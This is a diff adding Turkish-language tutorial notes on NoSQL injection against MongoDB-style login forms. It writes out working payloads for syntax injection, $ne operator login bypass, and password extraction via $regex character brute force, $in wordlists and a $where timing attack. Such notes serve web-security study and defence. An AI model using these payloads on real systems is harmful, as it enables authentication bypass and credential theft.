@@ -54,3 +54,69 @@ MongoDB query şu hale gelir:
 
 Bu sorgu, “username foo değil ve password bar değil” koşulunu sağlayan herhangi bir kullanıcıyı döndürecektir.
 
+# NoSQL Syntax Injection
+Syntax Injection, uygulamanın beklediği basit string değer yerine doğrudan query syntax’ını manipüle edecek input verilmesidir.
+Klasik örnek:
+```
+POST /login
+username=baran' || '1'=='1&password=foo
+```
+
+Eğer backend tarafında kullanıcı girdisi string escape edilmeden sorguya ekleniyorsa, NoSQL query objesi şu hale gelebilir:
+```
+{ "username": "baran' || '1'=='1", "password": "foo" }
+```
+
+# NoSQL Operator Injection
+Operator Injection, NoSQL’in desteklediği özel operatörleri ($ne, $gt, $in, $regex, $where) parametre içine enjekte ederek sorguyu değiştirmektir.
+Örnek payload:
+```
+POST /login
+username[$ne]=foo&password[$ne]=bar
+```
+
+Sorgu şu hale gelir:
+```
+{ "username": { "$ne": "foo" }, "password": { "$ne": "bar" } }
+```
+
+## Exploiting Syntax Injection to Extract Data
+Syntax Injection, genellikle hata mesajları veya response farkları üzerinden data extraction için kullanılabilir.
+
+Örnek senaryo:
+```
+username=admin' && this.password[0]=='a' || '1'=='1&password=foo
+```
+
+Eğer backend eval() veya where benzeri bir query parse ediyorsa, saldırgan password alanının karakterlerini boolean tabanlı testlerle brute-force edebilir.
+
+## Exploiting NoSQL Operator Injection to Extract Data
+Operator Injection, özellikle $regex ve $where kullanılarak data extraction için güçlüdür.
+
+### Regex tabanlı brute force
+```
+username=admin&password[$regex]=^a.*
+```
+
+Eğer şifre “a” ile başlıyorsa login başarılı.
+
+Sonraki adım:
+```
+username=admin&password[$regex]=^ab.*
+```
+
+Yanıt farklılığı şifre karakterlerini ortaya çıkarır.
+
+### $in Operatörü
+```
+username=admin&password[$in]=["123456","password","qwerty"]
+```
+
+Şifre hangi listedeyse login başarılı olur. Wordlist ile brute force hızlanır.
+
+### $where tabanlı zaman ölçümü
+```
+username=admin&password[$where]=function(){ if(this.password.charAt(0)=='a'){ sleep(5000); } return true; }
+```
+
+Yanıt gecikmesi üzerinden password ilk karakteri çıkarılabilir.
